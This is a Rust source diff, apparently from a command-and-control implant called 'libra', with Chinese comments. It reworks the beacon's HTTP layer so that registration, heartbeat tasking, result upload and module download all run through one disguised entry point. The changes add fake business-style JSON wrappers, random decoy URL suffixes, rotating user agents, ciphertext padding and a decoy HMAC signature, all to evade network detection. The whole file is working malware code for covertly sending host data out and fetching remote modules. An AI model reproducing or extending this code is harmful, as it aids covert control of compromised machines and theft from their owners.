@@ -1,60 +1,73 @@
-//! HTTP communicator — registration, heartbeat polling, result submission.
-//! Port of HttpCommunicator.cs.
+//! HTTP communicator — 单入口内部路由（流量伪装 Phase 2）。
 //!
-//! Heartbeat and result payloads are AES-256-GCM encrypted with the session
-//! key negotiated at registration (RSA-OAEP protected), using the canonical
-//! `nonce || tag || ciphertext` layout shared with the C# CryptoHelper.
+//! 所有 beacon 流量 POST 到 profile 配置的单一入口路径，请求体为业务风格
+//! 外层壳：`{ "<data_key>": "<AES-GCM 密文>", "<ts_key>": <ms>, "<rand_key>": "<hex>" }`。
+//! 密文内部是路由信封 `BeaconEnvelope{op, id, data}`：
+//!   op=reg 注册（预会话密钥） / op=hb 心跳 / op=res 结果 / op=mod 模块下载
+//! agent 标识 token 位于密文内 —— 线路上无任何固定标识头、无可枚举功能路径。
+//!
+//! 密文长度随机化：明文尾部追加随机数量空白（JSON 解析容忍），
+//! 心跳/结果节奏与 UA 由 profile 控制。
 
+use libra_common::models::{BeaconEnvelope, ProfileTransform};
 use libra_common::models::AgentTask;
+use rand::Rng;
 use reqwest::Client;
+use serde_json::Value;
 
 const AES_KEY_SIZE: usize = 32;
 
-/// Result of a successful registration, including the profile paths the server
-/// wants the agent to use for subsequent heartbeats/results.
+/// Result of a successful registration, including the transform profile the
+/// server wants the agent to use for subsequent requests.
 pub struct RegisterOutcome {
     pub agent_id: String,
     pub session_key: Option<Vec<u8>>,
-    pub heartbeat_path: String,
-    pub result_path: String,
-    /// Opaque per-session channel token issued by the server. Sent instead of
-    /// the stable agent id on subsequent requests so the beacon carries no
-    /// persistent identifier (rotates on every registration).
+    /// 流量伪装 profile（单入口路径/壳字段/UA 列表/padding/节奏）。
+    pub profile: Option<ProfileTransform>,
+    /// 会话 token（后续请求放入密文信封）。
     pub session_token: Option<String>,
+    /// 心跳间隔（毫秒，profile 或服务端下发值；0 = 保持构建时值）。
+    pub heartbeat_interval_ms: u64,
+    /// 抖动百分比（0 = 保持构建时值）。
+    pub jitter_percent: f64,
 }
 
 /// HTTP communicator for beacon-style communication with the C2 server.
 pub struct HttpCommunicator {
     client: Client,
     server_url: String,
-    register_path: String,
-    heartbeat_path: String,
-    result_path: String,
+    /// 单入口路径前缀（注册前用构建时 register_path，注册后切换 profile.entry_path）。
+    entry_path: String,
+    profile: Option<ProfileTransform>,
     session_token: Option<String>,
+    /// beacon secret（HMAC 假签名的 key；注册时保存）。
+    beacon_secret: String,
+    ua_index: std::sync::atomic::AtomicUsize,
 }
 
 impl HttpCommunicator {
     pub fn new(
         server_url: &str,
         register_path: &str,
-        heartbeat_path: &str,
-        result_path: &str,
+        _heartbeat_path: &str,
+        _result_path: &str,
     ) -> Self {
         let client = Client::builder()
             .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
             .build()
             .unwrap_or_else(|e| {
-                libra_common::dlog!("[http] Failed to create HTTP client with custom UA, using default: {}", e);
+                libra_common::dlog!("[http] Failed to create HTTP client, using default: {}", e);
                 Client::new()
             });
 
         Self {
             client,
             server_url: server_url.to_string(),
-            register_path: register_path.to_string(),
-            heartbeat_path: heartbeat_path.to_string(),
-            result_path: result_path.to_string(),
+            entry_path: register_path.to_string(),
+            profile: None,
             session_token: None,
+            beacon_secret: String::new(),
+            ua_index: std::sync::atomic::AtomicUsize::new(0),
         }
     }
 
@@ -63,36 +76,140 @@ impl HttpCommunicator {
         self.session_token = Some(token);
     }
 
-    fn register_url(&self) -> String {
-        format!("{}{}", self.server_url, self.register_path)
+    /// Adopt the traffic-shaping profile issued at registration.
+    pub fn set_profile(&mut self, profile: ProfileTransform) {
+        if !profile.entry_path.is_empty() {
+            self.entry_path = profile.entry_path.clone();
+        }
+        self.profile = Some(profile);
     }
 
-    fn heartbeat_url(&self) -> String {
-        format!("{}{}", self.server_url, self.heartbeat_path)
-    }
-
-    fn result_url(&self) -> String {
-        format!("{}{}", self.server_url, self.result_path)
-    }
-
-    /// Build the identity header for a beacon request: the per-session token
-    /// when available (opaque, rotates), falling back to the stable agent id
-    /// for servers that predate session tokens.
-    fn identity_header(&self, agent_id: &str) -> (&'static str, String) {
-        match &self.session_token {
-            Some(t) if !t.is_empty() => ("X-Request-Id", t.clone()),
-            _ => ("X-Agent-Id", agent_id.to_string()),
+    /// 本次请求的完整 URL：入口前缀 + 随机虚假业务后缀（profile 配置）。
+    fn entry_url(&self) -> String {
+        let suffix = self
+            .profile
+            .as_ref()
+            .and_then(|p| {
+                if p.path_suffixes.is_empty() {
+                    None
+                } else {
+                    let idx = rand::thread_rng().gen_range(0..p.path_suffixes.len());
+                    Some(p.path_suffixes[idx].as_str())
+                }
+            })
+            .unwrap_or("");
+        if suffix.is_empty() {
+            format!("{}{}", self.server_url, self.entry_path)
+        } else {
+            format!("{}{}/{}", self.server_url, self.entry_path.trim_end_matches('/'), suffix)
         }
     }
 
-    /// Register with the C2 server and adopt the profile paths it returns.
-    /// Returns the assigned agent_id, the RSA-encrypted AES session key (if
-    /// any), and the heartbeat/result paths to use going forward.
-    ///
-    /// When a beacon secret is configured, the registration body is encrypted
-    /// with a pre-session AES key derived from the secret (SHA-256), so the
-    /// handshake never carries the agent's RSA public key or host metadata in
-    /// plaintext. The server decrypts with the same derivation.
+    /// 按 profile 轮换 UA（无 profile 时用 client 默认 UA）。
+    fn pick_user_agent(&self) -> Option<String> {
+        let p = self.profile.as_ref()?;
+        if p.user_agents.is_empty() {
+            return None;
+        }
+        let idx = self.ua_index.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+        Some(p.user_agents[idx % p.user_agents.len()].clone())
+    }
+
+    /// 构造单入口请求：外层壳 + 密文 + 假签名 + 会话 token。
+    /// `inner_plain` 为密文内部的 JSON（信封），`key` 为加密密钥。
+    fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
+        // 密文长度随机化：明文尾部追加随机空白（JSON 解析容忍）
+        let (pmin, pmax) = self
+            .profile
+            .as_ref()
+            .map(|p| (p.padding_min as usize, (p.padding_max as usize).max(p.padding_min as usize)))
+            .unwrap_or((0, 0));
+        let pad_len = if pmax > 0 {
+            rand::thread_rng().gen_range(pmin..=pmax)
+        } else {
+            0
+        };
+        let padded = format!("{}{}", inner_plain, "\n".repeat(pad_len));
+        let cipher_b64 = libra_crypto::encrypt_payload(&padded, key);
+
+        let (dk, tk, rk, sk, sidk) = self
+            .profile
+            .as_ref()
+            .map(|p| (
+                p.data_key.as_str(),
+                p.ts_key.as_str(),
+                p.rand_key.as_str(),
+                p.sign_key.as_str(),
+                "sid", // token 字段名（当前固定，与服务端默认一致）
+            ))
+            .unwrap_or(("d", "ts", "r", "", "sid"));
+
+        let ts = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis();
+        let rand_hex: String = {
+            let mut b = [0u8; 4];
+            rand::thread_rng().fill(&mut b);
+            b.iter().map(|x| format!("{x:02x}")).collect()
+        };
+        let token = self.session_token.clone().unwrap_or_default();
+
+        // 假签名：HMAC-SHA256(beacon_secret, ts|cipher) 的 hex —— 真实算法，
+        // 与带鉴权的业务 API 结构一致；服务端宽松校验（失败不拒绝）。
+        let sign = if !sk.is_empty() && !self.beacon_secret.is_empty() {
+            Some(hmac_sign(&self.beacon_secret, &format!("{ts}|{cipher_b64}")))
+        } else {
+            None
+        };
+
+        // sid 字段仅在存在会话 token 时附带（注册请求无 token）
+        let with_token = format!(r#","{}":"{}""#, sidk, token);
+        let token_part = if token.is_empty() { String::new() } else { with_token };
+
+        match sign {
+            Some(s) => format!(
+                r#"{{"{}":"{}","{}":{},"{}":"{}","{}":"{}"{}}}"#,
+                dk, cipher_b64, tk, ts, rk, rand_hex, sk, s, token_part
+            ),
+            None => format!(
+                r#"{{"{}":"{}","{}":{},"{}":"{}"{}}}"#,
+                dk, cipher_b64, tk, ts, rk, rand_hex, token_part
+            ),
+        }
+    }
+
+    /// 发送单入口 POST 请求并返回响应体文本。
+    async fn post_envelope(&self, body: String) -> Result<(u16, String), String> {
+        let mut req = self.client.post(self.entry_url()).body(body);
+        if let Some(ua) = self.pick_user_agent() {
+            req = req.header(reqwest::header::USER_AGENT, ua);
+        }
+        let resp = req
+            .send()
+            .await
+            .map_err(|e| e.to_string())?;
+        let status = resp.status().as_u16();
+        let text = resp.text().await.map_err(|e| e.to_string())?;
+        Ok((status, text))
+    }
+
+    /// 从响应壳中提取密文并解密（响应格式与请求一致：`{data_key: b64}`）。
+    fn decrypt_response(&self, resp_body: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
+        let dk = self
+            .profile
+            .as_ref()
+            .map(|p| p.data_key.as_str())
+            .unwrap_or("d");
+        let v: Value = serde_json::from_str(resp_body).map_err(|e| format!("bad response json: {e}"))?;
+        let payload = v
+            .get(dk)
+            .and_then(|p| p.as_str())
+            .ok_or("missing payload in response")?;
+        libra_crypto::decrypt_payload(payload, key)
+    }
+
+    /// 注册：op=reg，预会话密钥加密（无会话密钥时的 bootstrap）。
     pub async fn register(
         &mut self,
         hostname: &str,
@@ -110,8 +227,9 @@ impl HttpCommunicator {
         } else {
             hardware_json
         };
+        self.beacon_secret = beacon_secret.to_string();
 
-        let json = format!(
+        let reg_json = format!(
             r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","beaconSecret":"{}","hardware":{},"hasSessionKey":{}}}"#,
             escape(hostname),
             escape(user_name),
@@ -124,203 +242,164 @@ impl HttpCommunicator {
             if has_session_key { "true" } else { "false" }
         );
 
-        // Encrypt the handshake with the pre-session key derived from the
-        // shared beacon secret (no key exchange needed — both sides know it).
-        let body = if beacon_secret.is_empty() {
-            json
+        // 预会话密钥：无 beacon secret 时明文注册（兼容旧部署）
+        let (body, key_for_encrypt) = if beacon_secret.is_empty() {
+            let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
+            (self.build_body(&envelope, &[0u8; AES_KEY_SIZE]), None)
         } else {
             let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
-            format!(
-                r#"{{"payload":"{}"}}"#,
-                libra_crypto::encrypt_payload(&json, &pre_key)
-            )
+            let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
+            (self.build_body(&envelope, &pre_key), Some(pre_key))
         };
 
-        let resp = self
-            .client
-            .post(self.register_url())
-            .header("Content-Type", "application/json")
-            .body(body)
-            .send()
-            .await
-            .map_err(|e| e.to_string())?;
-
-        if !resp.status().is_success() {
-            return Err(format!("Registration failed with status: {}", resp.status()));
+        let (status, resp_body) = self.post_envelope(body).await?;
+        if status != 200 {
+            return Err(format!("Registration failed with status: {status}"));
         }
 
-        let body = resp.text().await.map_err(|e| e.to_string())?;
-        let agent_id = extract_string(&body, "agent_id")
-            .ok_or_else(|| "agent_id not found in response".to_string())?;
+        // 注册响应：agent_id 等字段在明文 JSON 中（注册响应不含敏感数据），
+        // session_key/profile 从对应字段读取。
+        let v: Value = serde_json::from_str(&resp_body)
+            .map_err(|e| format!("bad register response: {e}"))?;
 
-        let session_key = extract_optional_b64(&body, "session_key");
+        let agent_id = v
+            .get("agent_id")
+            .and_then(|s| s.as_str())
+            .ok_or("agent_id not found in response")?
+            .to_string();
 
-        // Adopt the malleable-profile paths the server returned (fall back to
-        // the build-time paths when the field is absent).
-        if let Some(hb) = extract_string(&body, "heartbeat_url") {
-            if !hb.is_empty() {
-                self.heartbeat_path = hb;
-            }
+        let session_key = v
+            .get("session_key")
+            .and_then(|s| s.as_str())
+            .filter(|s| !s.is_empty())
+            .and_then(|s| {
+                use base64::Engine as _;
+                base64::engine::general_purpose::STANDARD.decode(s).ok()
+            });
+
+        let session_token = v
+            .get("session_token")
+            .and_then(|s| s.as_str())
+            .map(|s| s.to_string());
+        if let Some(t) = &session_token {
+            self.session_token = Some(t.clone());
         }
-        if let Some(r) = extract_string(&body, "result_url") {
-            if !r.is_empty() {
-                self.result_path = r;
-            }
+
+        // profile 解析（服务端未下发时保持默认）
+        let profile: Option<ProfileTransform> = v
+            .get("profile")
+            .and_then(|p| serde_json::from_value(p.clone()).ok());
+        if let Some(p) = &profile {
+            self.set_profile(p.clone());
         }
 
-        let session_token = extract_string(&body, "session_token");
-        self.session_token = session_token.clone();
+        let heartbeat_interval_ms = v
+            .get("heartbeat_interval_ms")
+            .and_then(|n| n.as_u64())
+            .unwrap_or(0);
+        let jitter_percent = v
+            .get("jitter_percent")
+            .and_then(|n| n.as_f64())
+            .unwrap_or(0.0);
 
+        let _ = key_for_encrypt;
         Ok(RegisterOutcome {
             agent_id,
             session_key,
-            heartbeat_path: self.heartbeat_path.clone(),
-            result_path: self.result_path.clone(),
+            profile,
             session_token,
+            heartbeat_interval_ms,
+            jitter_percent,
         })
     }
 
-    /// Send a heartbeat and receive a pending task (if any).
-    /// When `session_key` is provided the request/response are AES-GCM encrypted.
+    /// 心跳：op=hb。响应为壳包裹的密文，内含 pendingTask。
     pub async fn heartbeat(
         &self,
-        agent_id: &str,
+        _agent_id: &str,
         session_key: Option<&[u8; AES_KEY_SIZE]>,
     ) -> Result<Option<AgentTask>, String> {
-        let body = match session_key {
-            Some(key) => {
-                let ts = std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_millis() as i64;
-                let inner = format!(r#"{{"ts":{}}}"#, ts);
-                format!(
-                    r#"{{"payload":"{}"}}"#,
-                    libra_crypto::encrypt_payload(&inner, key)
-                )
-            }
-            None => "{}".to_string(),
-        };
+        let key = session_key.ok_or("no session key")?;
+        let token = self.session_token.clone().unwrap_or_default();
 
-        let (id_header, id_value) = self.identity_header(agent_id);
-        let resp = self
-            .client
-            .post(self.heartbeat_url())
-            .header(id_header, id_value)
-            .header("Content-Type", "application/json")
-            .body(body)
-            .send()
-            .await
-            .map_err(|e| e.to_string())?;
+        let ts = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() as i64;
+        let inner = serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
+            .to_string();
+        let body = self.build_body(&inner, key);
 
-        if !resp.status().is_success() {
-            if resp.status().as_u16() == 401 {
-                return Err("SESSION_LOST".to_string());
-            }
-            return Err(format!("Heartbeat failed: {}", resp.status()));
+        let (status, resp_body) = self.post_envelope(body).await?;
+        if status == 401 {
+            return Err("SESSION_LOST".to_string());
+        }
+        if status != 200 {
+            return Err(format!("Heartbeat failed: {status}"));
         }
 
-        let resp_body = resp.text().await.map_err(|e| e.to_string())?;
-
-        let json = match session_key {
-            Some(key) => {
-                let v: serde_json::Value = serde_json::from_str(&resp_body)
-                    .map_err(|e| format!("Failed to parse heartbeat response: {}", e))?;
-                let payload = v
-                    .get("payload")
-                    .and_then(|p| p.as_str())
-                    .ok_or("missing payload in heartbeat response")?;
-                libra_crypto::decrypt_payload(payload, key)?
-            }
-            None => resp_body,
-        };
-
-        let v: serde_json::Value = serde_json::from_str(&json)
-            .map_err(|e| format!("Failed to parse heartbeat response: {}", e))?;
+        let plain = self.decrypt_response(&resp_body, key)?;
+        let v: Value = serde_json::from_str(&plain)
+            .map_err(|e| format!("bad heartbeat payload: {e}"))?;
 
         match v.get("pendingTask") {
             Some(task_val) if !task_val.is_null() => {
                 let task_json = serde_json::to_string(task_val)
-                    .map_err(|e| format!("Failed to serialize pendingTask: {}", e))?;
+                    .map_err(|e| format!("task serialize: {e}"))?;
                 Ok(Some(parse_task(&task_json)))
             }
             _ => Ok(None),
         }
     }
 
-    /// Submit task result back to the C2 server.
-    /// When `session_key` is provided the result is AES-GCM encrypted.
+    /// 提交任务结果：op=res。
     pub async fn submit_result(
         &self,
-        agent_id: &str,
+        _agent_id: &str,
         result_json: &str,
         session_key: Option<&[u8; AES_KEY_SIZE]>,
     ) -> Result<(), String> {
-        let body = match session_key {
-            Some(key) => format!(
-                r#"{{"payload":"{}"}}"#,
-                libra_crypto::encrypt_payload(result_json, key)
-            ),
-            None => result_json.to_string(),
-        };
+        let key = session_key.ok_or("no session key")?;
+        let token = self.session_token.clone().unwrap_or_default();
 
-        let (id_header, id_value) = self.identity_header(agent_id);
-        self.client
-            .post(self.result_url())
-            .header(id_header, id_value)
-            .header("Content-Type", "application/json")
-            .body(body)
-            .send()
-            .await
-            .map_err(|e| e.to_string())?;
+        let inner = serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
+        let body = self.build_body(&inner, key);
+        let (status, _) = self.post_envelope(body).await?;
+        if status == 401 {
+            return Err("SESSION_LOST".to_string());
+        }
+        if status != 200 {
+            return Err(format!("Result submit failed: {status}"));
+        }
         Ok(())
     }
 
-    /// Download a cloud module (e.g. "shell") as raw bytes.
-    /// The request is an AES-GCM encrypted envelope `{ "payload": "<base64>" }`
-    /// containing the module name — no plaintext module name on the wire. The
-    /// response is encrypted with the session key in the same envelope.
+    /// 模块下载：op=mod（模块名在密文内，线路上不可见）。
     pub async fn download_module(
         &self,
         name: &str,
-        agent_id: &str,
+        _agent_id: &str,
         session_key: &[u8; AES_KEY_SIZE],
     ) -> Result<Vec<u8>, String> {
-        let url = format!("{}/api/beacon/module", self.server_url);
-        let inner = format!(r#"{{"name":"{}"}}"#, escape(name));
-        let body = format!(
-            r#"{{"payload":"{}"}}"#,
-            libra_crypto::encrypt_payload(&inner, session_key)
-        );
+        let token = self.session_token.clone().unwrap_or_default();
+        let inner = serde_json::json!({ "op": "mod", "id": token, "data": format!(r#"{{"name":"{}"}}"#, escape(name)) })
+            .to_string();
+        let body = self.build_body(&inner, session_key);
 
-        let (id_header, id_value) = self.identity_header(agent_id);
-        let resp = self
-            .client
-            .post(&url)
-            .header(id_header, id_value)
-            .header("Content-Type", "application/json")
-            .body(body)
-            .send()
-            .await
-            .map_err(|e| e.to_string())?;
-
-        if !resp.status().is_success() {
-            return Err(format!("module download failed: {}", resp.status()));
+        let (status, resp_body) = self.post_envelope(body).await?;
+        if status == 401 {
+            return Err("SESSION_LOST".to_string());
+        }
+        if status != 200 {
+            return Err(format!("module download failed: {status}"));
         }
 
-        let body = resp.text().await.map_err(|e| e.to_string())?;
-        let v: serde_json::Value = serde_json::from_str(&body)
-            .map_err(|e| format!("Failed to parse module response: {}", e))?;
-        let payload = v
-            .get("payload")
-            .and_then(|p| p.as_str())
-            .ok_or("missing payload in module response")?;
-
+        // 模块响应：密文内容是 base64 的模块二进制（libra_crypto::encrypt_bytes 布局）
+        let plain = self.decrypt_response(&resp_body, session_key)?;
         use base64::Engine as _;
-        let combined = base64::engine::general_purpose::STANDARD
-            .decode(payload)
-            .map_err(|e| e.to_string())?;
-        libra_crypto::decrypt_bytes(&combined, session_key)
+        base64::engine::general_purpose::STANDARD
+            .decode(plain.trim())
+            .map_err(|e| format!("module payload decode: {e}"))
     }
 }
 
@@ -330,19 +409,15 @@ fn escape(s: &str) -> String {
     libra_common::json_util::escape_json(s)
 }
 
-fn extract_string(json: &str, key: &str) -> Option<String> {
-    let v: serde_json::Value = serde_json::from_str(json).ok()?;
-    v.get(key)?.as_str().map(|s| s.to_string())
-}
-
-fn extract_optional_b64(json: &str, key: &str) -> Option<Vec<u8>> {
-    let v: serde_json::Value = serde_json::from_str(json).ok()?;
-    let s = v.get(key)?.as_str()?;
-    if s.is_empty() {
-        return None;
-    }
-    use base64::Engine as _;
-    base64::engine::general_purpose::STANDARD.decode(s).ok()
+/// HMAC-SHA256 hex（假签名）。
+fn hmac_sign(secret: &str, msg: &str) -> String {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    type HmacSha256 = Hmac<Sha256>;
+    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).expect("hmac key");
+    mac.update(msg.as_bytes());
+    let digest = mac.finalize().into_bytes();
+    digest.iter().map(|b| format!("{b:02x}")).collect()
 }
 
 fn parse_task(json: &str) -> AgentTask {
